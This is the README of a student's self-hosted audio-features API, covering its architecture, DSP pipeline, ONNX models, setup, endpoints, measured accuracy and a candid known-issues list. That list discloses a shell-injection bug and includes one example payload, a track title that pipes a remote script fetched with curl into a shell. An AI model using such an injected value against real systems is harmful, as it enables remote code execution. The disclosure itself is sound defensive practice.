<div align="center">

# Audioscape

**A self-hostable audio-features API.** Give it an artist and a track name, get back tempo, key, mood and a handful of other descriptors — the sort of thing the Spotify Audio Features endpoint used to give you before it was pulled.

<sub>TypeScript · Hono · BullMQ · ONNX Runtime · Postgres · Redis · Next.js</sub>

</div>

<br>

![Audioscape landing page](assets/landing.png)

<br>

## Read this first

There is no hosted instance. I built this to find out whether a usable Spotify-Audio-Features replacement could be put together out of open models and a few hundred lines of DSP, and it turns out it can. That question is answered, so the code is here for anyone who wants to run it, fork it, or lift the parts they need.

I'm a computer science student at UofT, and I don't have the funding to keep chipping away at these bugs or to host this for other people. YouTube proxies and background workers at any real volume would eat a chunk of money I don't currently have. Publishing the code is more useful than standing up a service I can't keep alive.

It works end to end. It is also a personal project that has been sitting on my disk for a while, with real rough edges. Every bug in [Known issues](#known-issues) was on my own list to fix before this stalled, and I would rather write them all down than quietly patch two and let you find the rest in production. [What the numbers actually mean](#what-the-numbers-actually-mean) has the measurements behind them.

Treat this as a worked example of what a Spotify Audio Features replacement looks like, not as the replacement. Spotify pulled public access and left a lot of side projects with nowhere to go; this is one demonstration that open models plus a queue plus a few hundred lines of DSP gets you most of the way there. Somebody willing to fix the five things in [If you want to work on this](#if-you-want-to-work-on-this) could turn it into something genuinely good.

If you want the short version: **the plumbing is solid, the feature values are approximate, and at least three of them are probably inverted.**

---

## Contents

- [What it does](#what-it-does)
- [Architecture](#architecture)
- [How a track gets analysed](#how-a-track-gets-analysed)
- [Running it locally](#running-it-locally)
- [The API](#the-api)
- [Webhooks](#webhooks)
- [What the numbers actually mean](#what-the-numbers-actually-mean)
- [Known issues](#known-issues)
- [If you want to work on this](#if-you-want-to-work-on-this)
- [Notes](#notes)
- [Repo layout](#repo-layout)
- [Licensing](#licensing)

---

## What it does

You ask for a track by name. If nobody has analysed it before, the request goes on a queue; a worker finds the audio, decodes it, runs eleven ONNX models over it, and writes the result to Postgres. Ask again and it comes back instantly. Set a webhook on your API key and you get pushed the result the moment it lands instead of polling for it.

One analysis produces:

| Field | What it is | Source |
| --- | --- | --- |
| `tempo` | BPM | onset-flux autocorrelation |
| `key`, `keyString`, `mode` | Musical key and major/minor | Krumhansl-Schmuckler chroma correlation |
| `duration_ms` | Track length | `ffprobe` |
| `danceability` | Rhythmic regularity and beat strength | Discogs-EffNet head |
| `energy` | Blend of the aggressive and happy heads | derived |
| `instrumentalness`, `speechiness` | Presence of vocals | voice/instrumental head |
| `mood.{happy,sad,relaxed,aggressive}` | Four independent binary mood classifiers | Discogs-EffNet heads |
| `valence`, `arousal` | Emotional coordinates, DEAM scale mapped to 0-1 | MusiCNN → MUSE regression |
| `approachability`, `engagement` | How accessible / how attention-holding | regression heads, sigmoid-squashed |
| `liveness` | Loudness variation across the track | RMS standard deviation |
| `timeSignature` | Always `4` | hardcoded, see [Known issues](#known-issues) |

Around it there's a dashboard for API keys, per-key daily usage charts, webhook secrets with HMAC signing, and a delivery log so you can see exactly what was sent to your endpoint and what came back.

<table>
<tr>
<td width="50%"><img src="assets/dashboard.png" alt="API key dashboard"></td>
<td width="50%"><img src="assets/create-key.png" alt="Key creation dialog"></td>
</tr>
</table>

---

## Architecture

Three processes, two datastores, one queue.

```mermaid
flowchart TB
    client(["Your app"])

    subgraph api["packages/api — Hono"]
        search["GET /audio/search"]
        analysis["GET /audio/analysis/:trackKey"]
        ingest["POST /audio/ingest/:trackKey"]
    end

    subgraph wrk["packages/worker — Node"]
        fetch["yt-dlp + ffmpeg<br/>→ 16 kHz &amp; 44.1 kHz PCM"]
        dsp["FFT · mel · chroma · onsets"]
        onnx["EffNet + MusiCNN<br/>and 9 heads"]
    end

    lastfm[["Last.fm"]]
    cache[("Redis<br/>metadata &amp; result cache")]
    queue[("Redis<br/>BullMQ queue")]
    pg[("Postgres<br/>tracks · keys · deliveries")]

    client -->|"Bearer as_live_…"| search
    client --> analysis
    search --> lastfm
    search -->|"track:{key}, 24h TTL"| cache
    analysis -->|"cache hit?"| cache
    analysis -->|"row exists?"| pg
    analysis -->|"miss → enqueue"| queue
    queue --> fetch
    fetch --> dsp
    dsp --> onnx
    onnx -->|"X-Server-Key"| ingest
    ingest --> pg
    ingest --> cache
    ingest -.->|"HMAC-signed webhook"| client

    classDef store fill:#0f172a,stroke:#334155,color:#e2e8f0
    classDef ext fill:#fffbeb,stroke:#b45309,color:#78350f
    class cache,queue,pg store
    class lastfm ext
```

**Why a queue at all.** Analysis is 8-20 seconds of pegged CPU per track. Doing that inside a request handler would mean holding HTTP connections open for the length of a download plus a full-track FFT, so the API hands off to BullMQ and the worker POSTs the finished result back to a server-key-protected ingest endpoint.

**Why the track key.** `sha256(artist:track)` truncated to 16 hex characters. It's a deterministic content address, which means clients can compute it themselves and skip the search round-trip entirely, and it doubles as the BullMQ job ID so two people asking for the same track at the same time get deduplicated into one job for free.

---

## How a track gets analysed

This is the interesting part, and it's all in one file: [`packages/worker/index.js`](packages/worker/index.js).

### 1. Fetch and decode

`yt-dlp` resolves `ytsearch1:{artist} {track} official audio` and pulls an MP3. `ffmpeg` decodes it twice, to mono 32-bit float at 16 kHz (what the neural models want) and at 44.1 kHz (what the DSP wants), by way of a raw file on disk that gets read straight into a `Float32Array`.

### 2. Signal processing, from scratch

There is no Essentia here, and no DSP library at all. An iterative radix-2 FFT, a Hann window, a mel filterbank and a chromagram are implemented directly in the file. Three of Essentia's algorithms have hand-written stand-ins:

- **Tempo** — spectral flux onset envelope, autocorrelated over lags corresponding to 40-208 BPM, argmax wins.
- **Key** — chroma vector accumulated across the track, then Pearson-correlated against the twelve rotations of the Krumhansl-Schmuckler major and minor profiles.
- **Dynamic complexity** — standard deviation of 200 ms RMS frames, scaled.

### 3. Embeddings and heads

Two embedding backbones, nine classifier and regression heads on top of them:

```
16 kHz mono ─┬─ 96-band mel, 128-frame patches ── Discogs-EffNet ─┬─ danceability
             │                                    (batch of 64)   ├─ mood_happy / sad / relaxed / aggressive
             │                                                    ├─ approachability, engagement  (regression)
             │                                                    └─ voice_instrumental
             │
             └─ 96-band mel, 187-frame patches ── MSD-MusiCNN ──── MUSE ── valence, arousal
```

Every head output is averaged across the patch dimension to give one number per track. All eleven sessions load once at startup, in about 190 ms.

### 4. Timings

Measured on an M-series Mac, one 4:48 track, all eleven models resident:

| Stage | ms |
| --- | ---: |
| Model load (once, at boot) | 189 |
| ffmpeg decode, both sample rates | 802 |
| Mel spectrogram, EffNet patches | 1,458 |
| Mel spectrogram, MusiCNN patches | 1,010 |
| Tempo detection | 2,183 |
| Key detection | 959 |
| Dynamic complexity | 31 |
| EffNet forward pass | 290 |
| 8 classifier/regression heads | 38 |
| MusiCNN + MUSE | 2,508 |
| **Total, excluding download** | **9,342** |

The models are not the bottleneck. Inference is 2.8 seconds of the 9.3; the other 6.5 is JavaScript doing FFTs one frame at a time on the event loop. That is also why `concurrency: 5` on the worker doesn't buy five times the throughput — the DSP is synchronous, so five concurrent jobs mostly take turns. Moving the front-end into a worker thread, or into Python with `numpy`, is the single highest-leverage change anyone could make here.

---

## Running it locally

You need Node 20+, `pnpm`, Docker, `ffmpeg` and `yt-dlp` on your `PATH`.

### 1. Datastores

```bash
docker compose up -d   # Postgres 17 on :5432, Redis 8 on :6379
```

### 2. Environment

`packages/api/.env`

```ini
DATABASE_URL="postgres://postgres:postgres@localhost:5432/app"
REDIS_CONNECTION_STRING="redis://localhost:6379"

BETTER_AUTH_SECRET="<openssl rand -hex 32>"
BETTER_AUTH_URL="http://localhost:8888"

LAST_FM_API_KEY="<https://www.last.fm/api/account/create>"
SERVER_KEY="<openssl rand -hex 32>"   # must match the worker's

GITHUB_CLIENT_ID=""
GITHUB_CLIENT_SECRET=""
GOOGLE_CLIENT_ID=""
GOOGLE_CLIENT_SECRET=""

PORT=8888
NODE_ENV="development"
```

`packages/worker/.env`

```ini
REDIS_CONNECTION_STRING="redis://localhost:6379"
API_BASE_URL="http://localhost:8888"
SERVER_KEY="<same value as the API>"
```

`packages/www/.env`

```ini
NEXT_PUBLIC_API_URL="http://localhost:8888"
```

You need at least one OAuth provider configured, because Better Auth is the only way into the dashboard and there is no email/password flow.

### 3. Schema

```bash
cd packages/api
pnpm install
pnpm db:push
```

Use `db:push`, not `drizzle-kit migrate`. The committed migration in `packages/api/drizzle/` is stale — it creates a single `tracks` table without a `track_key` column and none of the auth, API key or webhook delivery tables. Running it gets you a database the app cannot start against.

### 4. The three processes

Three terminals:

```bash
cd packages/api    && pnpm dev     # Hono on :8888 (hot reload, needs bun)
cd packages/worker && pnpm start   # BullMQ consumer
cd packages/www    && pnpm dev     # Next.js on :3000
```

The root `dev:api` and `dev:worker` scripts both shell out to `bun run --cwd … dev`, and the worker has no `dev` script, so `pnpm dev:worker` from the root fails. Run the worker directly with `pnpm start` until that's fixed. The API's own `dev` script uses `bun run --hot`, so you need Bun installed for hot reload even though everything else is `pnpm`.

Then open `http://localhost:3000`, sign in, create a key, and you're going.

### Deploying

`packages/api` has a `railway.json`, and `packages/worker` has a `nixpacks.toml` that pulls in `ffmpeg` and `yt-dlp`; that's how this ran before. Each package needs to be a separate Railway service with its root directory set accordingly, pointed at internal connection strings for Redis and Postgres. The web app is a stock Next.js build, so Vercel takes it as-is.

One thing to fix before deploying anywhere: [`packages/api/src/lib/auth.ts:6`](packages/api/src/lib/auth.ts#L6) hardcodes `baseURL` and `trustedOrigins` to localhost, so OAuth callbacks will fail on any real host until those read from the environment.

---

## The API

Every endpoint under `/api/audio` wants `Authorization: Bearer as_live_…`.

### `GET /api/audio/search`

Resolves a fuzzy query to candidate tracks via Last.fm, ranked by a weighted similarity score (70% track name, 30% artist), deduplicated on a normalised artist-plus-title key. Spaces become `+`.

```bash
curl 'http://localhost:8888/api/audio/search?artist=Pink+Floyd&track=Cymbaline' \
  -H 'Authorization: Bearer as_live_…'
```

```json
{
  "success": true,
  "data": [
    {
      "trackName": "Cymbaline",
      "artist": "Pink Floyd",
      "thumbnailUrl": "https://lastfm.freetls.fastly.net/i/u/174s/2a96…png",
      "trackKey": "f63116f780b3b1eb",
      "match_score": 0.947
    }
  ]
}
```

The side effect matters as much as the response: each result's metadata is cached in Redis under `track:{trackKey}` for 24 hours, and that cache is what the worker later reads to know what to download. A track key that isn't already in Postgres and has never been through search can't be analysed — you'll get a `409` back.

### `GET /api/audio/analysis/:trackKey`

Four things can happen, in this order:

1. **Redis has it** → returns immediately from the `saved:` cache.
2. **Postgres has it** → returns the row and warms the cache.
3. **A job is already running** → returns `queuePosition` so you can show progress.
4. **Nothing yet** → enqueues, returns `"Track has been queued for analysis."`

You can compute the key yourself and skip search entirely, as long as the track is already in the database:

```ts
const trackKey = createHash("sha256")
  .update(`${artist.toLowerCase().trim()}:${track.toLowerCase().trim()}`)
  .digest("hex")
  .slice(0, 16);
```

### Key management

`/api/users/keys/*` — session-authenticated, not key-authenticated. Create, update, revoke, delete, rotate the webhook secret, fire a test webhook, read daily usage, list recent deliveries. Keys are stored as a SHA-256 of the raw value plus an 8-character lookup prefix so a lookup is one indexed read rather than a scan, and the plaintext key is shown exactly once at creation.

Full request and response documentation lives in `packages/www/content/docs`, which is a Fumadocs site you can run locally:

![Docs site](assets/docs.png)

---

## Webhooks

Set a webhook URL on a key and finished analyses get POSTed to it, with an HMAC-SHA256 of the raw body in `X-Signature`. Verify it in constant time:

```ts
import crypto from "node:crypto";

export function verifySignature(payload: string, signature: string) {
  const expected = crypto
    .createHmac("sha256", process.env.AUDIOSCAPE_WEBHOOK_SECRET)
    .update(payload)
    .digest("hex");

  return crypto.timingSafeEqual(Buffer.from(expected), Buffer.from(signature));
}
```

Deliveries time out after 5 seconds and every attempt is written to `webhook_deliveries` with status, HTTP code, duration, and the exact payload and headers sent, which is visible in the dashboard. There are no retries — a failed delivery is recorded and dropped.

---

## What the numbers actually mean

I ran the pipeline over four clips with known properties to see how much to trust the output. Three are Creative Commons instrumentals from Kevin MacLeod, one is a LibriVox recording of *Alice in Wonderland* — pure unaccompanied speech, which should be trivially separable from music.

### The DSP holds up better than the models

Key detection was correct on all four synthetic triads I fed it:

| Ground truth | Detected |
| --- | --- |
| C major | ✅ C major |
| A minor | ✅ A minor |
| F# major | ✅ F# major |
| E minor | ✅ E minor |

Tempo detection was correct on two of five synthetic click tracks. The other three landed on exactly half the true tempo:

| Ground truth | Detected | Ratio |
| ---: | ---: | ---: |
| 90 BPM | 89.1 | 0.99 |
| 120 BPM | **60.1** | 0.50 |
| 128 BPM | 129.2 | 1.01 |
| 140 BPM | **69.8** | 0.50 |
| 174 BPM | **86.1** | 0.50 |

Two separate causes. The autocorrelation takes a plain argmax over a wide lag range with no tempo prior, so on a steady pulse the peak at twice the beat period wins about as often as the right one. Then [line 259](packages/worker/index.js#L259) halves anything above 140 BPM outright, which means **no track will ever be reported above 140 BPM**, and drum & bass, most house, and a good deal of metal are guaranteed to come back at half speed. That heuristic exists to suppress double-time detection, and it is doing far more harm than good.

### Several feature values look inverted

Running the four clips and printing *both* softmax columns instead of the one the code reads:

| Clip | `voice_instrumental` `[0, 1]` | `danceability` `[0, 1]` |
| --- | --- | --- |
| Cold Funk (funk, instrumental) | `[0.946, 0.054]` | `[0.946, 0.054]` |
| Deep Haze (ambient, instrumental) | `[0.911, 0.089]` | `[0.759, 0.241]` |
| Cut and Run (hard electronic, instrumental) | `[0.646, 0.354]` | `[0.799, 0.201]` |
| *Alice in Wonderland* (pure speech) | `[0.571, 0.429]` | `[0.451, 0.549]` |

Column 0 is the one that behaves. It is highest for the instrumentals and lowest for the speech recording, and it ranks the funk track above the ambient one for danceability, which is what you'd expect. Column 1 does the opposite of all of that. This matches Essentia's documented class ordering for these models — `[instrumental, voice]`, `[danceable, not_danceable]`, `[happy, non_happy]` and so on — where index 0 is the positive class.

The worker reads column 1 for `instrumentalness`, `danceability` and all four moods ([lines 509-517](packages/worker/index.js#L509)). So a purely instrumental funk track comes out of this API as:

```json
{ "instrumentalness": 0.054, "speechiness": 0.946, "danceability": 0.054 }
```

which is backwards on all three counts. Confirm the ordering against the model metadata JSON on the [Essentia models site](https://essentia.upf.edu/models.html) before changing anything, but the empirical evidence is one-directional.

### Absolute values are sensitive to the front end

The mel spectrogram here is a hand-written approximation of Essentia's `TensorflowInputMusiCNN`, not a port of it. It uses a power spectrum where Essentia uses magnitude, HTK mel scaling where Essentia uses Slaney, unnormalised triangular filters, and `log1p` where Essentia uses `log10(1 + 10000·x)`.

Those details are not cosmetic. Swapping in a closer approximation of Essentia's compression, with nothing else changed, moved the aggressive-mood score on the same audio from `0.284` to `0.931`. The models were trained on one input distribution and are being fed another, so the embeddings are off-distribution and the head outputs are compressed into a narrow, weakly-discriminative band. It is why the happy score spans all of 0.07 across a funk track, an ambient piece and an audiobook — three things that should not look alike to a mood classifier.

**Practically:** treat every model-derived field as ordinal at best. Ranking tracks against each other within your own corpus will mostly work. Comparing a value to Spotify's, or to a threshold from a paper, will not.

### And the persisted row is smaller than the response

The `tracks` table has no columns for `keyString`, `arousal`, `approachability`, `engagement`, `mood` or `meta`. Drizzle drops unknown keys silently rather than erroring, which I confirmed against a real Postgres instance — the insert succeeds and six fields quietly vanish.

The webhook payload has them. The Redis `saved:` cache has them, because it's written from the same object. The database row does not. So once Redis is flushed or that key is evicted, `/audio/analysis/:trackKey` starts returning a strictly smaller object than the one documented, with no error anywhere. The schema also declares `acousticness` and `loudness`, which nothing ever writes.

---

## Known issues

Roughly in the order I'd fix them.

| | Where | Issue |
| --- | --- | --- |
| 🔴 | [`worker/index.js:401`](packages/worker/index.js#L401) | **Shell injection.** Artist and track names come from the Last.fm response and are interpolated straight into an `exec` string. Last.fm's catalogue is user-contributed, so a track titled `x"; curl evil.sh \| sh; "` reaches a shell. Use `execFile` with an argument array. |
| 🔴 | [`api/routes/audio/route.ts:153`](packages/api/src/routes/audio/route.ts#L153) vs [`:194`](packages/api/src/routes/audio/route.ts#L194) | **Webhooks silently lost.** Subscribing while a job is already in flight does `rpush(trackKey, …)`; enqueuing does `sadd("webhooks:" + trackKey, …)`; ingest reads `smembers("webhooks:" + trackKey)`. Wrong key *and* wrong data type, so the second and later subscribers to any in-flight track never get notified. |
| 🔴 | [`api/routes/audio/route.ts:249`](packages/api/src/routes/audio/route.ts#L249) | Six analysis fields are dropped on insert because the columns don't exist. See [above](#and-the-persisted-row-is-smaller-than-the-response). |
| 🟠 | [`worker/index.js:509`](packages/worker/index.js#L509) | Classifier class indices look inverted for `instrumentalness`, `speechiness`, `danceability` and the four moods. |
| 🟠 | [`worker/index.js:259`](packages/worker/index.js#L259) | The unconditional halve-above-140 rule caps reported tempo at 140 BPM forever. |
| 🟠 | `packages/api/drizzle/` | The committed migration doesn't match `schema.ts`. `db:push` works; `migrate` produces a broken database. |
| 🟠 | [`api/lib/auth.ts:6`](packages/api/src/lib/auth.ts#L6) | `baseURL` and `trustedOrigins` are hardcoded to localhost, so OAuth breaks on any real deployment. |
| 🟡 | [`worker/index.js:443`](packages/worker/index.js#L443) | `liveness` is loudness variation divided by 9. It has nothing to do with a live audience, which is what the docs claim it measures. Either rename it or compute something else. |
| 🟡 | `worker/index.js` | `timeSignature` is hardcoded to `4` and shipped as if it were measured. |
| 🟡 | [`api/routes/audio/route.ts:157`](packages/api/src/routes/audio/route.ts#L157) | Queue position is computed by fetching every waiting job on every request. Fine at ten jobs, not at ten thousand. |
| 🟡 | `worker/index.js` | Both decoded sample-rate copies of a track sit in memory at once — roughly 60 MB for a four-minute song — multiplied by `concurrency: 5`. |
| 🟡 | `worker/index.js` | Short tracks are padded by repeating the final mel patch until the batch reaches 64, which biases the averaged embedding toward whatever the song ends on. |
| 🟡 | `api/routes/audio/route.ts` | `webhooks:{trackKey}` sets and `saved:{trackKey}` entries are written without a TTL and never cleaned up. |
| ⚪ | `package.json` | `pnpm dev:worker` runs `bun run --cwd packages/worker dev`, and the worker package has no `dev` script. |
| ⚪ | [`api/middlewares/is-valid-key.ts:30`](packages/api/src/middlewares/is-valid-key.ts#L30) | A bare `console.log(isValid)` on every authenticated request. |
| ⚪ | `packages/www/content/docs` | The docs describe rate limiting and name Essentia.js as the analysis engine. There is no rate limiting anywhere in the codebase, and Essentia was replaced with hand-written DSP. |

Nothing here is unfixable, and none of it stops the thing working. It's the honest state of a project that got to "yes, this is possible" and stopped there.

---

## If you want to work on this

The highest-value work, in order:

1. **Fix the class indices.** Smallest diff in the repo, biggest correctness win.
2. **Match the front end to Essentia.** Port `TensorflowInputMusiCNN` faithfully — magnitude spectrum, Slaney mel, unit-triangle normalisation, `log10(1 + 10000·x)` — and validate embeddings against a reference implementation on the same audio. Everything downstream depends on this.
3. **Move the DSP off the event loop.** Worker threads, or rewrite the worker in Python with `numpy` and `essentia`, which was already the note in `todo.md`. Either would roughly halve wall-clock time and make `concurrency` mean something.
4. **Give tempo a prior.** Weight the autocorrelation peaks with a log-Gaussian centred around 120 BPM instead of taking a raw argmax, and delete the halving heuristic.
5. **Replace the YouTube dependency.** `yt-dlp` breaks whenever YouTube changes something — it was returning `HTTP 403` from my machine while I was writing this. Anything that made source audio pluggable would make the whole system far less fragile.

---

## Notes

I wrote this mostly as a testbed. I wanted to see how the Discogs-EffNet and MusiCNN models behaved outside Essentia, whether `onnxruntime-node` could carry them, and what BullMQ, Hono, Drizzle and Better Auth were like to actually build on. A lot of what's in here is me answering those questions rather than designing something for production.

The project I was really building this for is written in Python, mainly because model loading is much faster there. That version isn't going public — it was sold to a startup during Toronto Tech Week, at a meeting at George Brown College with the partnered UofT tech teams, where I was there as a UofT student. This repo is the JavaScript sibling that stayed with me, so it's the one that gets to be open source.

---

## Repo layout

```
audio-feat/
├── packages/
│   ├── api/                 Hono server — auth, endpoints, key management (~1.2k LOC)
│   │   ├── src/routes/      search · analysis · ingest · keys · auth
│   │   ├── src/db/          Drizzle schema
│   │   └── drizzle/         migrations (stale — use db:push)
│   ├── worker/              BullMQ consumer, DSP and inference (553 LOC, one file)
│   │   └── models/          11 ONNX models, 22 MB, committed to the repo
│   └── www/                 Next.js dashboard + Fumadocs site (~3.2k LOC)
└── assets/                  screenshots for this README
```

| | |
| --- | --- |
| **API** | [Hono](https://hono.dev) on [Bun](https://bun.sh), [Drizzle](https://orm.drizzle.team), [Better Auth](https://better-auth.com), [Zod](https://zod.dev) |
| **Worker** | Node, [onnxruntime-node](https://onnxruntime.ai), [BullMQ](https://bullmq.io), `ffmpeg`, `yt-dlp` |
| **Web** | [Next.js](https://nextjs.org) 16, React 19, Tailwind 4, shadcn/ui, [Fumadocs](https://fumadocs.dev), Recharts |
| **Data** | Postgres 17, Redis 8 |
| **Models** | Discogs-EffNet, MSD-MusiCNN and MUSE, from the [MTG at Universitat Pompeu Fabra](https://essentia.upf.edu/models.html) |

---

## Licensing

The code is MIT — see [`LICENSE`](LICENSE). **The models in `packages/worker/models/` are not mine and are not covered by it.** They come from the Music Technology Group at Universitat Pompeu Fabra, and several of the Essentia model releases carry non-commercial terms. Check the licence for each model on the [Essentia models page](https://essentia.upf.edu/models.html) before you use this for anything commercial — and if you redistribute this repo, note that the `.onnx` files are committed to it, so you're redistributing them too.

The Discogs-EffNet, MusiCNN and MUSE architectures are the work of the MTG. All this project does is run them.
